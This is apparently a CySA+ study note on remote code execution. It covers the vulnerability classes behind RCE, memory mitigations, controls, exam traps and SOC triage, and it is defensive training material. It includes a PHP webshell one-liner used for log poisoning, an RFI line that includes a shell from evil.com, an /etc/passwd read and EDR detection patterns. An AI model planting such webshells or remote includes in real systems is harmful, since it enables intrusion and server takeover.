# RCE — Remote Code Execution

## What it is

In **FIFA**, there's a glitch lineage older than Ultimate Team itself — the kind where a specific skill move chain, executed in the right corner of the box with the right player, lets you score from impossible angles. EA patches it, the community finds a new one. For a few weeks every cycle, somebody on YouTube is scoring 40 goals a match because they found a sequence of inputs the game engine never expected, and the engine just *runs* whatever they tell it to. The game wasn't supposed to allow that shot. It allowed it anyway, because the input handler didn't validate hard enough.

That's exactly what RCE does — an attacker sends input to a service that the service was never supposed to execute, and the service executes it anyway, on the attacker's behalf, with whatever privileges the service runs as.

**Remote Code Execution (RCE)** is a vulnerability class where an attacker — without local access to the host — causes the target system to execute attacker-controlled code. "Remote" means the attack vector traverses a network. "Code execution" means the attacker is no longer just reading data or crashing a process — they're running commands. RCE is the endgame of most exploit chains. Almost every CVE that lands on the front page of Bleeping Computer with a CVSS above 9.0 is either RCE directly or a vulnerability that chains into RCE.

## Why it matters

RCE is the bug class that ends incidents in your lap. Log4Shell, ProxyLogon, MOVEit, PrintNightmare, Citrix Bleed downstream chains — every one of them put SOCs on 18-hour shifts because RCE on an internet-facing service means an attacker can pivot before your ticket queue refreshes.

For CySA+ Objective 2.4, you're expected to recognize the vulnerability classes that *lead* to RCE, recommend the controls that mitigate them, and know which of them CompTIA tests as distinct concepts even though they all dump into the same hole. Buffer overflows, injection flaws, deserialization, file inclusion, integer overflows — they don't all look the same on a scan report, but they can all end the same way: with `whoami` returning `nt authority\system` on a box you own.

In career terms: the analyst who can read a vuln scan, identify which CVEs are RCE-capable on which exposed assets, and rank them above the noise — that analyst gets promoted. The one who treats every CVSS 9.8 as identical drowns.

## Key facts

### The RCE family tree

RCE isn't one bug. It's an outcome. Multiple distinct vulnerability classes route to it:

| Vulnerability class | Mechanism | Classic example |
|---|---|---|
| **[[Buffer overflow]]** (stack/heap) | Write past allocated memory, overwrite return pointer or function pointer | EternalBlue (SMBv1) |
| **[[Integer overflow]]** | Arithmetic wraps, leading to undersized buffer allocation, then overflow | Many kernel bugs |
| **[[Injection flaws]]** (command, SQL, LDAP) | Attacker input concatenated into an interpreter call | Shellshock, classic webshells |
| **[[Deserialization]] flaws** | Untrusted serialized object instantiates attacker-chosen class | Log4Shell (JNDI lookup) |
| **[[Remote file inclusion]] (RFI)** | App pulls and executes a remote file based on user input | Older PHP `include($_GET['page'])` |
| **[[Local file inclusion]] (LFI)** | App loads a local file based on user input; chained with log poisoning → RCE | Apache log → `<?php system($_GET['c']); ?>` |
| **[[Server-side request forgery]] (SSRF)** | Server fetches attacker-chosen URL; chains to internal RCE via metadata endpoints or internal services | Capital One AWS metadata abuse |
| **[[Insecure design]] / unsafe API** | Service exposes a function that takes code as input | Jenkins script console, exposed Spring Actuator |
| **[[End-of-life]] components** | Unpatched CVE remains exploitable forever | IIS 6.0 on Server 2003 |

CompTIA tests these as separate items but expects you to know they all can produce code execution.

### Stack vs heap overflow

| Type | Where | Exploit primitive |
|---|---|---|
| **Stack overflow** | Local variables, return address on the stack | Overwrite return address → redirect EIP/RIP to shellcode |
| **Heap overflow** | Dynamically allocated memory (`malloc`) | Corrupt heap metadata, function pointers, vtables |

Modern mitigations — ASLR, DEP/NX, stack canaries, CFG — make naive overflows hard. Real-world exploits chain ROP gadgets to bypass DEP, then leak addresses to defeat ASLR. You don't need to write the exploit for the exam. You need to know the mitigations and that **defense in depth on memory protections is what keeps a single overflow from becoming RCE**.

### How RCE actually shows up in your environment

- **Internet-facing web app** with unpatched CVE → mass scanning hits within hours of a public PoC
- **Internal application server** with a deserialization bug → reachable from any compromised user workstation
- **Management interface** (Jenkins, GitLab runners, Kubernetes dashboards) exposed without auth or behind weak auth
- **Edge appliance** (VPN concentrator, firewall mgmt, load balancer) — these have been the 2023–2025 RCE goldmine (Ivanti, Fortinet, Citrix, Cisco)
- **Print spoolers, RPC services, SMB** — classic Windows network-reachable RCE surface

### Controls to mitigate RCE (this is the exam-graded part)

**Preventive:**
- **Patch management** — the only real fix for a known RCE CVE. Prioritize internet-facing first.
- **Input validation and output encoding** — allowlist-based, not denylist. Defeats injection at the source.
- **Parameterized queries / prepared statements** — kills SQL injection RCE paths.
- **Safe deserialization** — never deserialize untrusted data; if you must, use allowlisted classes.
- **Disable dangerous functions** — PHP `eval`, `system`, `exec`; remove if not needed.
- **Memory-safe languages** — Rust, Go, managed runtimes eliminate entire classes of overflow.
- **Compiler flags** — `-fstack-protector`, ASLR, DEP, control-flow integrity.
- **Sandboxing** — run untrusted code in containers, seccomp, AppArmor, SELinux.
- **Least privilege** — service accounts that *don't* run as SYSTEM/root. An RCE in a low-priv service is a much smaller fire.
- **WAF** — virtual patching for known signatures. Buys time during a patch window, doesn't replace patching.
- **Network segmentation** — RCE on the DMZ shouldn't reach the domain controller.

**Detective:**
- **[[EDR]]** — flags `cmd.exe` spawned by `w3wp.exe`, `java.exe` calling `powershell.exe -enc`, suspicious child processes from web service contexts.
- **[[SIEM]] correlation** — web server access logs + outbound DNS to never-before-seen domains = beacon out of an RCE.
- **File integrity monitoring** — webshells dropped to `/var/www/`, `wwwroot/`.
- **Egress filtering** — RCE without outbound = attacker can't pull stage 2. Outbound denylist beats nothing.

### CompTIA exam traps

> **CompTIA exam trap:** RFI vs LFI. **Remote File Inclusion** loads a file from an attacker-controlled URL (`include('http://evil.com/shell.txt')`) — direct RCE. **Local File Inclusion** loads a local file (`include('/etc/passwd')`) — typically just disclosure, but chains to RCE via log poisoning, session file inclusion, or `/proc/self/environ`. If the question describes pulling from a URL, that's RFI. If it describes traversing the local filesystem, that's LFI.

> **CompTIA exam trap:** Buffer overflow is *not* the same as integer overflow. Integer overflow is arithmetic wrapping (`size + 1` becomes 0 on a `uint`); the *consequence* is often a buffer overflow when the wrapped value is used as a size. CompTIA may list them as separate answer choices for the same scenario — pick the one that names the root cause described.

> **CompTIA exam trap:** "Which control prevents RCE?" — the trap answer is usually a WAF. The better answer is patching or input validation at the application layer. WAF is compensating, not preventive at the root.

> **CompTIA exam trap:** SSRF is not RCE by itself — it's an RCE *enabler*. SSRF gets the server to make requests on the attacker's behalf. That becomes RCE when it hits cloud metadata (IMDSv1), internal admin panels, or services with no auth between internal hosts.

### Severity scoring reality

A CVSS 9.8 RCE on a server with no network exposure, behind a WAF, running as a sandboxed low-priv user, with EDR — is not the same fire as a CVSS 8.1 RCE on an internet-facing edge appliance running as root. **CVSS base score is not your prioritization output.** Apply environmental and temporal metrics. CISA KEV (Known Exploited Vulnerabilities) catalog and EPSS (Exploit Prediction Scoring System) tell you what's actually being weaponized. Patch what's burning, not what scores highest.

*The change board will fight you on the 9.8 that's air-gapped. Bring EPSS data and the KEV listing. Numbers win arguments that adjectives lose.*

## SOC reality

- **The alert at 3am:** EDR fires "suspicious child process: w3wp.exe → cmd.exe → powershell.exe -enc <base64>" on a public-facing IIS server. Your first move is not to kill the process. Your first move is to snapshot — memory image, network connections, parent process tree — before containment destroys the evidence. *An EDR alert is not a contained host.*
- **The L1 triage question:** Is this asset internet-facing? Does the running service have a recent RCE CVE? When was the last patch cycle? Pull the vuln scan from yesterday and check.
- **What the IR lead asks:** "Scope, impact, evidence preserved? Have we seen lateral movement? What does outbound look like from this host in the last 24h?"
- **Never promise leadership** you've contained an RCE until you've confirmed: no persistence mechanisms (scheduled tasks, services, registry run keys, webshells on disk), no new accounts, no outbound C2 beaconing, no lateral SMB/RDP/WinRM sessions originating from the box. Webshells especially — attackers drop three in different paths so cleanup of one doesn't matter.
- **The escalation point:** L1 confirms suspicious execution → L2 validates IoCs and pulls memory → IR team takes containment decision → if confirmed compromise on a regulated asset, legal and compliance get the call before any wipe-and-reimage. Chain of custody starts at the snapshot, not at the forensic image.

## Related concepts

[[Buffer overflow]] · [[Stack overflow]] · [[Heap overflow]] · [[Integer overflow]] · [[Injection flaws]] · [[SQL injection]] · [[Command injection]] · [[Deserialization]] · [[Local file inclusion]] · [[Remote file inclusion]] · [[Directory traversal]] · [[Server-side request forgery]] · [[Cross-site scripting]] · [[Privilege escalation]] · [[Insecure design]] · [[Security misconfiguration]] · [[End-of-life components]] · [[CVSS]] · [[CISA KEV]] · [[EPSS]] · [[Patch management]] · [[WAF]] · [[EDR]] · [[Input validation]] · [[Webshell]] · [[Log4Shell]]

*Source: VIRGIL knowledge base — 2026-05-11*